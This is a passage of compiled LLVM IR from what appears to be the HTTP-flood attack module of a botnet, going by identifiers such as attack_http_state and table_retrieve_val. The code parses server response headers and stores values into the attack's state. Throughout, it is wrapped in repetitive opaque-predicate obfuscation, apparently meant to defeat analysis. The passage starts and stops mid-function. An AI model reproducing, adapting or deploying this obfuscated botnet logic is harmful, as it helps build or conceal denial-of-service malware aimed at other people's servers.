  %1952 = sub i32 %1950, 1
  %1953 = mul i32 %1950, %1952
  %1954 = urem i32 %1953, 2
  %1955 = icmp eq i32 %1954, 0
  %1956 = icmp slt i32 %1951, 10
  %1957 = or i1 %1955, %1956
  br i1 %1957, label %originalBBpart2279, label %originalBB277alteredBB

originalBBpart2279:                               ; preds = %originalBB277
  br label %1958

; <label>:1958:                                   ; preds = %originalBBpart2279, %1927
  %1959 = load i32, i32* @x.17
  %1960 = load i32, i32* @y.18
  %1961 = sub i32 %1959, 1
  %1962 = mul i32 %1959, %1961
  %1963 = urem i32 %1962, 2
  %1964 = icmp eq i32 %1963, 0
  %1965 = icmp slt i32 %1960, 10
  %1966 = or i1 %1964, %1965
  br i1 %1966, label %originalBB281, label %originalBB281alteredBB

originalBB281:                                    ; preds = %originalBB281alteredBB, %1958
  %1967 = load i32, i32* @x.17
  %1968 = load i32, i32* @y.18
  %1969 = sub i32 %1967, 1
  %1970 = mul i32 %1967, %1969
  %1971 = urem i32 %1970, 2
  %1972 = icmp eq i32 %1971, 0
  %1973 = icmp slt i32 %1968, 10
  %1974 = or i1 %1972, %1973
  br i1 %1974, label %originalBBpart2283, label %originalBB281alteredBB

originalBBpart2283:                               ; preds = %originalBB281
  br label %1975

; <label>:1975:                                   ; preds = %originalBBpart2283, %1891
  br label %1976

; <label>:1976:                                   ; preds = %1975, %1853
  %1977 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1978 = load i32, i32* %12, align 4
  %1979 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1980 = call i32 @util_stristr(i8* %1977, i32 %1978, i8* %1979)
  %1981 = icmp ne i32 %1980, -1
  br i1 %1981, label %1982, label %2059

; <label>:1982:                                   ; preds = %1976
  %1983 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1984 = load i32, i32* %12, align 4
  %1985 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1986 = call i32 @util_stristr(i8* %1983, i32 %1984, i8* %1985)
  store i32 %1986, i32* %44, align 4
  %1987 = load i32, i32* %44, align 4
  %1988 = sext i32 %1987 to i64
  %1989 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1988
  %1990 = load i8, i8* %1989, align 1
  %1991 = sext i8 %1990 to i32
  %1992 = icmp eq i32 %1991, 32
  br i1 %1992, label %1993, label %1996

; <label>:1993:                                   ; preds = %1982
  %1994 = load i32, i32* %44, align 4
  %1995 = add nsw i32 %1994, 1
  store i32 %1995, i32* %44, align 4
  br label %1996

; <label>:1996:                                   ; preds = %1993, %1982
  %1997 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1998 = load i32, i32* %44, align 4
  %1999 = sext i32 %1998 to i64
  %2000 = getelementptr inbounds i8, i8* %1997, i64 %1999
  %2001 = load i32, i32* %12, align 4
  %2002 = load i32, i32* %44, align 4
  %2003 = sub nsw i32 %2001, %2002
  %2004 = call i32 @util_memsearch(i8* %2000, i32 %2003, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2004, i32* %45, align 4
  %2005 = load i32, i32* %45, align 4
  %2006 = icmp ne i32 %2005, -1
  br i1 %2006, label %2007, label %2058

; <label>:2007:                                   ; preds = %1996
  %2008 = load i32, i32* @x.17
  %2009 = load i32, i32* @y.18
  %2010 = sub i32 %2008, 1
  %2011 = mul i32 %2008, %2010
  %2012 = urem i32 %2011, 2
  %2013 = icmp eq i32 %2012, 0
  %2014 = icmp slt i32 %2009, 10
  %2015 = or i1 %2013, %2014
  br i1 %2015, label %originalBB285, label %originalBB285alteredBB

originalBB285:                                    ; preds = %originalBB285alteredBB, %2007
  %2016 = load i32, i32* %44, align 4
  %2017 = sext i32 %2016 to i64
  %2018 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2017
  store i8* %2018, i8** %46, align 8
  %2019 = load i32, i32* %45, align 4
  %2020 = icmp sge i32 %2019, 2
  %2021 = load i32, i32* @x.17
  %2022 = load i32, i32* @y.18
  %2023 = sub i32 %2021, 1
  %2024 = mul i32 %2021, %2023
  %2025 = urem i32 %2024, 2
  %2026 = icmp eq i32 %2025, 0
  %2027 = icmp slt i32 %2022, 10
  %2028 = or i1 %2026, %2027
  br i1 %2028, label %originalBBpart2287, label %originalBB285alteredBB

originalBBpart2287:                               ; preds = %originalBB285
  br i1 %2020, label %2029, label %2048

; <label>:2029:                                   ; preds = %originalBBpart2287
  %2030 = load i32, i32* @x.17
  %2031 = load i32, i32* @y.18
  %2032 = sub i32 %2030, 1
  %2033 = mul i32 %2030, %2032
  %2034 = urem i32 %2033, 2
  %2035 = icmp eq i32 %2034, 0
  %2036 = icmp slt i32 %2031, 10
  %2037 = or i1 %2035, %2036
  br i1 %2037, label %originalBB289, label %originalBB289alteredBB

originalBB289:                                    ; preds = %originalBB289alteredBB, %2029
  %2038 = load i32, i32* %45, align 4
  %2039 = sub nsw i32 %2038, 2
  store i32 %2039, i32* %45, align 4
  %2040 = load i32, i32* @x.17
  %2041 = load i32, i32* @y.18
  %2042 = sub i32 %2040, 1
  %2043 = mul i32 %2040, %2042
  %2044 = urem i32 %2043, 2
  %2045 = icmp eq i32 %2044, 0
  %2046 = icmp slt i32 %2041, 10
  %2047 = or i1 %2045, %2046
  br i1 %2047, label %originalBBpart2300, label %originalBB289alteredBB

originalBBpart2300:                               ; preds = %originalBB289
  br label %2048

; <label>:2048:                                   ; preds = %originalBBpart2300, %originalBBpart2287
  %2049 = load i32, i32* %44, align 4
  %2050 = load i32, i32* %45, align 4
  %2051 = add nsw i32 %2049, %2050
  %2052 = sext i32 %2051 to i64
  %2053 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2052
  store i8 0, i8* %2053, align 1
  %2054 = load i8*, i8** %46, align 8
  %2055 = call i32 @util_atoi(i8* %2054, i32 10)
  %2056 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2057 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2056, i32 0, i32 14
  store i32 %2055, i32* %2057, align 4
  br label %2058

; <label>:2058:                                   ; preds = %2048, %1996
  br label %2062

; <label>:2059:                                   ; preds = %1976
  %2060 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2061 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2060, i32 0, i32 14
  store i32 0, i32* %2061, align 4
  br label %2062

; <label>:2062:                                   ; preds = %2059, %2058
  %2063 = load i32, i32* @x.17
  %2064 = load i32, i32* @y.18
  %2065 = sub i32 %2063, 1
  %2066 = mul i32 %2063, %2065
  %2067 = urem i32 %2066, 2
  %2068 = icmp eq i32 %2067, 0
  %2069 = icmp slt i32 %2064, 10
  %2070 = or i1 %2068, %2069
  br i1 %2070, label %originalBB302, label %originalBB302alteredBB

originalBB302:                                    ; preds = %originalBB302alteredBB, %2062
  store i32 0, i32* %37, align 4
  %2071 = load i32, i32* @x.17
  %2072 = load i32, i32* @y.18
  %2073 = sub i32 %2071, 1
  %2074 = mul i32 %2071, %2073
  %2075 = urem i32 %2074, 2
  %2076 = icmp eq i32 %2075, 0
  %2077 = icmp slt i32 %2072, 10
  %2078 = or i1 %2076, %2077
  br i1 %2078, label %originalBBpart2304, label %originalBB302alteredBB

originalBBpart2304:                               ; preds = %originalBB302
  br label %2079

; <label>:2079:                                   ; preds = %2398, %originalBBpart2304
  %2080 = load i32, i32* @x.17
  %2081 = load i32, i32* @y.18
  %2082 = sub i32 %2080, 1
  %2083 = mul i32 %2080, %2082
  %2084 = urem i32 %2083, 2
  %2085 = icmp eq i32 %2084, 0
  %2086 = icmp slt i32 %2081, 10
  %2087 = or i1 %2085, %2086
  br i1 %2087, label %originalBB306, label %originalBB306alteredBB

originalBB306:                                    ; preds = %originalBB306alteredBB, %2079
  %2088 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2089 = load i32, i32* %37, align 4
  %2090 = sext i32 %2089 to i64
  %2091 = getelementptr inbounds i8, i8* %2088, i64 %2090
  %2092 = load i32, i32* %12, align 4
  %2093 = call i8* @table_retrieve_val(i32 46, i32* null)
  %2094 = call i32 @util_stristr(i8* %2091, i32 %2092, i8* %2093)
  %2095 = icmp ne i32 %2094, -1
  %2096 = load i32, i32* @x.17
  %2097 = load i32, i32* @y.18
  %2098 = sub i32 %2096, 1
  %2099 = mul i32 %2096, %2098
  %2100 = urem i32 %2099, 2
  %2101 = icmp eq i32 %2100, 0
  %2102 = icmp slt i32 %2097, 10
  %2103 = or i1 %2101, %2102
  br i1 %2103, label %originalBBpart2308, label %originalBB306alteredBB

originalBBpart2308:                               ; preds = %originalBB306
  br i1 %2095, label %2104, label %2109

; <label>:2104:                                   ; preds = %originalBBpart2308
  %2105 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2106 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2105, i32 0, i32 15
  %2107 = load i32, i32* %2106, align 4
  %2108 = icmp slt i32 %2107, 5
  br label %2109

; <label>:2109:                                   ; preds = %2104, %originalBBpart2308
  %2110 = phi i1 [ false, %originalBBpart2308 ], [ %2108, %2104 ]
  br i1 %2110, label %2111, label %2402

; <label>:2111:                                   ; preds = %2109
  %2112 = load i32, i32* @x.17
  %2113 = load i32, i32* @y.18
  %2114 = sub i32 %2112, 1
  %2115 = mul i32 %2112, %2114
  %2116 = urem i32 %2115, 2
  %2117 = icmp eq i32 %2116, 0
  %2118 = icmp slt i32 %2113, 10
  %2119 = or i1 %2117, %2118
  br i1 %2119, label %originalBB310, label %originalBB310alteredBB

originalBB310:                                    ; preds = %originalBB310alteredBB, %2111
  %2120 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2121 = load i32, i32* %37, align 4
  %2122 = sext i32 %2121 to i64
  %2123 = getelementptr inbounds i8, i8* %2120, i64 %2122
  %2124 = load i32, i32* %12, align 4
  %2125 = call i8* @table_retrieve_val(i32 46, i32* null)
  %2126 = call i32 @util_stristr(i8* %2123, i32 %2124, i8* %2125)
  store i32 %2126, i32* %47, align 4
  %2127 = load i32, i32* %37, align 4
  %2128 = load i32, i32* %47, align 4
  %2129 = add nsw i32 %2127, %2128
  %2130 = sext i32 %2129 to i64
  %2131 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2130
  %2132 = load i8, i8* %2131, align 1
  %2133 = sext i8 %2132 to i32
  %2134 = icmp eq i32 %2133, 32
  %2135 = load i32, i32* @x.17
  %2136 = load i32, i32* @y.18
  %2137 = sub i32 %2135, 1
  %2138 = mul i32 %2135, %2137
  %2139 = urem i32 %2138, 2
  %2140 = icmp eq i32 %2139, 0
  %2141 = icmp slt i32 %2136, 10
  %2142 = or i1 %2140, %2141
  br i1 %2142, label %originalBBpart2321, label %originalBB310alteredBB

originalBBpart2321:                               ; preds = %originalBB310
  br i1 %2134, label %2143, label %2146

; <label>:2143:                                   ; preds = %originalBBpart2321
  %2144 = load i32, i32* %47, align 4
  %2145 = add nsw i32 %2144, 1
  store i32 %2145, i32* %47, align 4
  br label %2146

; <label>:2146:                                   ; preds = %2143, %originalBBpart2321
  %2147 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2148 = load i32, i32* %37, align 4
  %2149 = sext i32 %2148 to i64
  %2150 = getelementptr inbounds i8, i8* %2147, i64 %2149
  %2151 = load i32, i32* %47, align 4
  %2152 = sext i32 %2151 to i64
  %2153 = getelementptr inbounds i8, i8* %2150, i64 %2152
  %2154 = load i32, i32* %12, align 4
  %2155 = load i32, i32* %37, align 4
  %2156 = sub nsw i32 %2154, %2155
  %2157 = load i32, i32* %47, align 4
  %2158 = sub nsw i32 %2156, %2157
  %2159 = call i32 @util_memsearch(i8* %2153, i32 %2158, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2159, i32* %48, align 4
  %2160 = load i32, i32* %48, align 4
  %2161 = icmp ne i32 %2160, -1
  br i1 %2161, label %2162, label %2398

; <label>:2162:                                   ; preds = %2146
  %2163 = load i32, i32* @x.17
  %2164 = load i32, i32* @y.18
  %2165 = sub i32 %2163, 1
  %2166 = mul i32 %2163, %2165
  %2167 = urem i32 %2166, 2
  %2168 = icmp eq i32 %2167, 0
  %2169 = icmp slt i32 %2164, 10
  %2170 = or i1 %2168, %2169
  br i1 %2170, label %originalBB323, label %originalBB323alteredBB

originalBB323:                                    ; preds = %originalBB323alteredBB, %2162
  %2171 = load i32, i32* %37, align 4
  %2172 = load i32, i32* %47, align 4
  %2173 = add nsw i32 %2171, %2172
  %2174 = sext i32 %2173 to i64
  %2175 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2174
  store i8* %2175, i8** %49, align 8
  %2176 = load i32, i32* %48, align 4
  %2177 = icmp sge i32 %2176, 2
  %2178 = load i32, i32* @x.17
  %2179 = load i32, i32* @y.18
  %2180 = sub i32 %2178, 1
  %2181 = mul i32 %2178, %2180
  %2182 = urem i32 %2181, 2
  %2183 = icmp eq i32 %2182, 0
  %2184 = icmp slt i32 %2179, 10
  %2185 = or i1 %2183, %2184
  br i1 %2185, label %originalBBpart2329, label %originalBB323alteredBB

originalBBpart2329:                               ; preds = %originalBB323
  br i1 %2177, label %2186, label %2189

; <label>:2186:                                   ; preds = %originalBBpart2329
  %2187 = load i32, i32* %48, align 4
  %2188 = sub nsw i32 %2187, 2
  store i32 %2188, i32* %48, align 4
  br label %2189

; <label>:2189:                                   ; preds = %2186, %originalBBpart2329
  %2190 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2191 = load i32, i32* %37, align 4
  %2192 = sext i32 %2191 to i64
  %2193 = getelementptr inbounds i8, i8* %2190, i64 %2192
  %2194 = load i32, i32* %47, align 4
  %2195 = sext i32 %2194 to i64
  %2196 = getelementptr inbounds i8, i8* %2193, i64 %2195
  %2197 = load i32, i32* %12, align 4
  %2198 = load i32, i32* %37, align 4
  %2199 = sub nsw i32 %2197, %2198
  %2200 = load i32, i32* %47, align 4
  %2201 = sub nsw i32 %2199, %2200
  %2202 = call i32 @util_memsearch(i8* %2196, i32 %2201, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2203 = icmp sgt i32 %2202, 0
  br i1 %2203, label %2204, label %2219

; <label>:2204:                                   ; preds = %2189
  %2205 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2206 = load i32, i32* %37, align 4
  %2207 = sext i32 %2206 to i64
  %2208 = getelementptr inbounds i8, i8* %2205, i64 %2207
  %2209 = load i32, i32* %47, align 4
  %2210 = sext i32 %2209 to i64
  %2211 = getelementptr inbounds i8, i8* %2208, i64 %2210
  %2212 = load i32, i32* %12, align 4
  %2213 = load i32, i32* %37, align 4
  %2214 = sub nsw i32 %2212, %2213
  %2215 = load i32, i32* %47, align 4
  %2216 = sub nsw i32 %2214, %2215
  %2217 = call i32 @util_memsearch(i8* %2211, i32 %2216, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2218 = sub nsw i32 %2217, 1
  store i32 %2218, i32* %48, align 4
  br label %2219

; <label>:2219:                                   ; preds = %2204, %2189
  %2220 = load i32, i32* %37, align 4
  %2221 = load i32, i32* %47, align 4
  %2222 = add nsw i32 %2220, %2221
  %2223 = load i32, i32* %48, align 4
  %2224 = add nsw i32 %2222, %2223
  %2225 = sext i32 %2224 to i64
  %2226 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2225
  store i8 0, i8* %2226, align 1
  store i32 0, i32* %10, align 4
  br label %2227

; <label>:2227:                                   ; preds = %originalBBpart2345, %2219
  %2228 = load i32, i32* @x.17
  %2229 = load i32, i32* @y.18
  %2230 = sub i32 %2228, 1
  %2231 = mul i32 %2228, %2230
  %2232 = urem i32 %2231, 2
  %2233 = icmp eq i32 %2232, 0
  %2234 = icmp slt i32 %2229, 10
  %2235 = or i1 %2233, %2234
  br i1 %2235, label %originalBB331, label %originalBB331alteredBB

originalBB331:                                    ; preds = %originalBB331alteredBB, %2227
  %2236 = load i32, i32* %10, align 4
  %2237 = load i8*, i8** %49, align 8
  %2238 = call i32 @util_strlen(i8* %2237)
  %2239 = icmp slt i32 %2236, %2238
  %2240 = load i32, i32* @x.17
  %2241 = load i32, i32* @y.18
  %2242 = sub i32 %2240, 1
  %2243 = mul i32 %2240, %2242
  %2244 = urem i32 %2243, 2
  %2245 = icmp eq i32 %2244, 0
  %2246 = icmp slt i32 %2241, 10
  %2247 = or i1 %2245, %2246
  br i1 %2247, label %originalBBpart2333, label %originalBB331alteredBB

originalBBpart2333:                               ; preds = %originalBB331
  br i1 %2239, label %2248, label %2309

; <label>:2248:                                   ; preds = %originalBBpart2333
  %2249 = load i8*, i8** %49, align 8
  %2250 = load i32, i32* %10, align 4
  %2251 = sext i32 %2250 to i64
  %2252 = getelementptr inbounds i8, i8* %2249, i64 %2251
  %2253 = load i8, i8* %2252, align 1
  %2254 = sext i8 %2253 to i32
  %2255 = icmp eq i32 %2254, 61
  br i1 %2255, label %2256, label %2273

; <label>:2256:                                   ; preds = %2248
  %2257 = load i32, i32* @x.17
  %2258 = load i32, i32* @y.18
  %2259 = sub i32 %2257, 1
  %2260 = mul i32 %2257, %2259
  %2261 = urem i32 %2260, 2
  %2262 = icmp eq i32 %2261, 0
  %2263 = icmp slt i32 %2258, 10
  %2264 = or i1 %2262, %2263
  br i1 %2264, label %originalBB335, label %originalBB335alteredBB

originalBB335:                                    ; preds = %originalBB335alteredBB, %2256
  %2265 = load i32, i32* @x.17
  %2266 = load i32, i32* @y.18
  %2267 = sub i32 %2265, 1
  %2268 = mul i32 %2265, %2267
  %2269 = urem i32 %2268, 2
  %2270 = icmp eq i32 %2269, 0
  %2271 = icmp slt i32 %2266, 10
  %2272 = or i1 %2270, %2271
  br i1 %2272, label %originalBBpart2337, label %originalBB335alteredBB

originalBBpart2337:                               ; preds = %originalBB335
  br label %2309

; <label>:2273:                                   ; preds = %2248
  %2274 = load i32, i32* @x.17
  %2275 = load i32, i32* @y.18
  %2276 = sub i32 %2274, 1
  %2277 = mul i32 %2274, %2276
  %2278 = urem i32 %2277, 2
  %2279 = icmp eq i32 %2278, 0
  %2280 = icmp slt i32 %2275, 10
  %2281 = or i1 %2279, %2280
  br i1 %2281, label %originalBB339, label %originalBB339alteredBB

originalBB339:                                    ; preds = %originalBB339alteredBB, %2273
  %2282 = load i32, i32* @x.17
  %2283 = load i32, i32* @y.18
  %2284 = sub i32 %2282, 1
  %2285 = mul i32 %2282, %2284
  %2286 = urem i32 %2285, 2
  %2287 = icmp eq i32 %2286, 0
  %2288 = icmp slt i32 %2283, 10
  %2289 = or i1 %2287, %2288
  br i1 %2289, label %originalBBpart2341, label %originalBB339alteredBB

originalBBpart2341:                               ; preds = %originalBB339
  br label %2290

; <label>:2290:                                   ; preds = %originalBBpart2341
  %2291 = load i32, i32* @x.17
  %2292 = load i32, i32* @y.18
  %2293 = sub i32 %2291, 1
  %2294 = mul i32 %2291, %2293
  %2295 = urem i32 %2294, 2
  %2296 = icmp eq i32 %2295, 0
  %2297 = icmp slt i32 %2292, 10
  %2298 = or i1 %2296, %2297
  br i1 %2298, label %originalBB343, label %originalBB343alteredBB

originalBB343:                                    ; preds = %originalBB343alteredBB, %2290
  %2299 = load i32, i32* %10, align 4
  %2300 = add nsw i32 %2299, 1
  store i32 %2300, i32* %10, align 4
  %2301 = load i32, i32* @x.17
  %2302 = load i32, i32* @y.18
  %2303 = sub i32 %2301, 1
  %2304 = mul i32 %2301, %2303
  %2305 = urem i32 %2304, 2
  %2306 = icmp eq i32 %2305, 0
  %2307 = icmp slt i32 %2302, 10
  %2308 = or i1 %2306, %2307
  br i1 %2308, label %originalBBpart2345, label %originalBB343alteredBB

originalBBpart2345:                               ; preds = %originalBB343
  br label %2227

; <label>:2309:                                   ; preds = %originalBBpart2337, %originalBBpart2333
  %2310 = load i8*, i8** %49, align 8
  %2311 = load i32, i32* %10, align 4
  %2312 = sext i32 %2311 to i64
  %2313 = getelementptr inbounds i8, i8* %2310, i64 %2312
  %2314 = load i8, i8* %2313, align 1
  %2315 = sext i8 %2314 to i32
  %2316 = icmp eq i32 %2315, 61
  br i1 %2316, label %2317, label %2397

; <label>:2317:                                   ; preds = %2309
  %2318 = load i32, i32* @x.17
  %2319 = load i32, i32* @y.18
  %2320 = sub i32 %2318, 1
  %2321 = mul i32 %2318, %2320
  %2322 = urem i32 %2321, 2
  %2323 = icmp eq i32 %2322, 0
  %2324 = icmp slt i32 %2319, 10
  %2325 = or i1 %2323, %2324
  br i1 %2325, label %originalBB347, label %originalBB347alteredBB

originalBB347:                                    ; preds = %originalBB347alteredBB, %2317
  %2326 = load i32, i32* %10, align 4
  store i32 %2326, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  %2327 = load i32, i32* @x.17
  %2328 = load i32, i32* @y.18
  %2329 = sub i32 %2327, 1
  %2330 = mul i32 %2327, %2329
  %2331 = urem i32 %2330, 2
  %2332 = icmp eq i32 %2331, 0
  %2333 = icmp slt i32 %2328, 10
  %2334 = or i1 %2332, %2333
  br i1 %2334, label %originalBBpart2349, label %originalBB347alteredBB

originalBBpart2349:                               ; preds = %originalBB347
  br label %2335

; <label>:2335:                                   ; preds = %2354, %originalBBpart2349
  %2336 = load i32, i32* %10, align 4
  %2337 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2338 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2337, i32 0, i32 15
  %2339 = load i32, i32* %2338, align 4
  %2340 = icmp slt i32 %2336, %2339
  br i1 %2340, label %2341, label %2357

; <label>:2341:                                   ; preds = %2335
  %2342 = load i8*, i8** %49, align 8
  %2343 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2344 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2343, i32 0, i32 16
  %2345 = load i32, i32* %10, align 4
  %2346 = sext i32 %2345 to i64
  %2347 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2344, i64 0, i64 %2346
  %2348 = getelementptr inbounds [128 x i8], [128 x i8]* %2347, i32 0, i32 0
  %2349 = load i32, i32* %50, align 4
  %2350 = call signext i8 @util_strncmp(i8* %2342, i8* %2348, i32 %2349)
  %2351 = icmp ne i8 %2350, 0
  br i1 %2351, label %2352, label %2353

; <label>:2352:                                   ; preds = %2341
  store i32 1, i32* %51, align 4
  br label %2357

; <label>:2353:                                   ; preds = %2341
  br label %2354

; <label>:2354:                                   ; preds = %2353
  %2355 = load i32, i32* %10, align 4
  %2356 = add nsw i32 %2355, 1
  store i32 %2356, i32* %10, align 4
  br label %2335

; <label>:2357:                                   ; preds = %2352, %2335
  %2358 = load i32, i32* %51, align 4
  %2359 = icmp ne i32 %2358, 0
  br i1 %2359, label %2396, label %2360

; <label>:2360:                                   ; preds = %2357
  %2361 = load i32, i32* @x.17
  %2362 = load i32, i32* @y.18
  %2363 = sub i32 %2361, 1
  %2364 = mul i32 %2361, %2363
  %2365 = urem i32 %2364, 2
  %2366 = icmp eq i32 %2365, 0
  %2367 = icmp slt i32 %2362, 10
  %2368 = or i1 %2366, %2367
  br i1 %2368, label %originalBB351, label %originalBB351alteredBB

originalBB351:                                    ; preds = %originalBB351alteredBB, %2360
  %2369 = load i8*, i8** %49, align 8
  %2370 = call i32 @util_strlen(i8* %2369)
  %2371 = icmp slt i32 %2370, 128
  %2372 = load i32, i32* @x.17
  %2373 = load i32, i32* @y.18
  %2374 = sub i32 %2372, 1
  %2375 = mul i32 %2372, %2374
  %2376 = urem i32 %2375, 2
  %2377 = icmp eq i32 %2376, 0
  %2378 = icmp slt i32 %2373, 10
  %2379 = or i1 %2377, %2378
  br i1 %2379, label %originalBBpart2353, label %originalBB351alteredBB

originalBBpart2353:                               ; preds = %originalBB351
  br i1 %2371, label %2380, label %2395

; <label>:2380:                                   ; preds = %originalBBpart2353
  %2381 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2382 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2381, i32 0, i32 16
  %2383 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2384 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2383, i32 0, i32 15
  %2385 = load i32, i32* %2384, align 4
  %2386 = sext i32 %2385 to i64
  %2387 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2382, i64 0, i64 %2386
  %2388 = getelementptr inbounds [128 x i8], [128 x i8]* %2387, i32 0, i32 0
  %2389 = load i8*, i8** %49, align 8
  %2390 = call i32 @util_strcpy(i8* %2388, i8* %2389)
  %2391 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2392 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2391, i32 0, i32 15
  %2393 = load i32, i32* %2392, align 4
  %2394 = add nsw i32 %2393, 1
  store i32 %2394, i32* %2392, align 4
  br label %2395

; <label>:2395:                                   ; preds = %2380, %originalBBpart2353
  br label %2396

; <label>:2396:                                   ; preds = %2395, %2357
  br label %2397

; <label>:2397:                                   ; preds = %2396, %2309
  br label %2398

; <label>:2398:                                   ; preds = %2397, %2146
  %2399 = load i32, i32* %47, align 4
  %2400 = load i32, i32* %37, align 4
  %2401 = add nsw i32 %2400, %2399
  store i32 %2401, i32* %37, align 4
  br label %2079

; <label>:2402:                                   ; preds = %2109
  %2403 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2404 = load i32, i32* %12, align 4
  %2405 = call i8* @table_retrieve_val(i32 45, i32* null)
  %2406 = call i32 @util_stristr(i8* %2403, i32 %2404, i8* %2405)
  %2407 = icmp ne i32 %2406, -1
  br i1 %2407, label %2408, label %2667

; <label>:2408:                                   ; preds = %2402
  %2409 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2410 = load i32, i32* %12, align 4
  %2411 = call i8* @table_retrieve_val(i32 45, i32* null)
  %2412 = call i32 @util_stristr(i8* %2409, i32 %2410, i8* %2411)
  store i32 %2412, i32* %52, align 4
  %2413 = load i32, i32* %52, align 4
  %2414 = sext i32 %2413 to i64
  %2415 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2414
  %2416 = load i8, i8* %2415, align 1
  %2417 = sext i8 %2416 to i32
  %2418 = icmp eq i32 %2417, 32
  br i1 %2418, label %2419, label %2438

; <label>:2419:                                   ; preds = %2408
  %2420 = load i32, i32* @x.17
  %2421 = load i32, i32* @y.18
  %2422 = sub i32 %2420, 1
  %2423 = mul i32 %2420, %2422
  %2424 = urem i32 %2423, 2
  %2425 = icmp eq i32 %2424, 0
  %2426 = icmp slt i32 %2421, 10
  %2427 = or i1 %2425, %2426
  br i1 %2427, label %originalBB355, label %originalBB355alteredBB

originalBB355:                                    ; preds = %originalBB355alteredBB, %2419
  %2428 = load i32, i32* %52, align 4
  %2429 = add nsw i32 %2428, 1
  store i32 %2429, i32* %52, align 4
  %2430 = load i32, i32* @x.17
  %2431 = load i32, i32* @y.18
  %2432 = sub i32 %2430, 1
  %2433 = mul i32 %2430, %2432
  %2434 = urem i32 %2433, 2
  %2435 = icmp eq i32 %2434, 0
  %2436 = icmp slt i32 %2431, 10
  %2437 = or i1 %2435, %2436
  br i1 %2437, label %originalBBpart2359, label %originalBB355alteredBB

originalBBpart2359:                               ; preds = %originalBB355
  br label %2438

; <label>:2438:                                   ; preds = %originalBBpart2359, %2408
  %2439 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2440 = load i32, i32* %52, align 4
  %2441 = sext i32 %2440 to i64
  %2442 = getelementptr inbounds i8, i8* %2439, i64 %2441
  %2443 = load i32, i32* %12, align 4
  %2444 = load i32, i32* %52, align 4
  %2445 = sub nsw i32 %2443, %2444
  %2446 = call i32 @util_memsearch(i8* %2442, i32 %2445, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2446, i32* %53, align 4
  %2447 = load i32, i32* %53, align 4
  %2448 = icmp ne i32 %2447, -1
  br i1 %2448, label %2449, label %2650

; <label>:2449:                                   ; preds = %2438
  %2450 = load i32, i32* %52, align 4
  %2451 = sext i32 %2450 to i64
  %2452 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2451
  store i8* %2452, i8** %54, align 8
  %2453 = load i32, i32* %53, align 4
  %2454 = icmp sge i32 %2453, 2
  br i1 %2454, label %2455, label %2458

; <label>:2455:                                   ; preds = %2449
  %2456 = load i32, i32* %53, align 4
  %2457 = sub nsw i32 %2456, 2
  store i32 %2457, i32* %53, align 4
  br label %2458

; <label>:2458:                                   ; preds = %2455, %2449
  %2459 = load i32, i32* %52, align 4
  %2460 = load i32, i32* %53, align 4
  %2461 = add nsw i32 %2459, %2460
  %2462 = sext i32 %2461 to i64
  %2463 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %2462
  store i8 0, i8* %2463, align 1
  %2464 = load i32, i32* %53, align 4
  %2465 = add nsw i32 %2464, 1
  store i32 %2465, i32* %53, align 4
  %2466 = load i8*, i8** %54, align 8
  %2467 = load i32, i32* %53, align 4
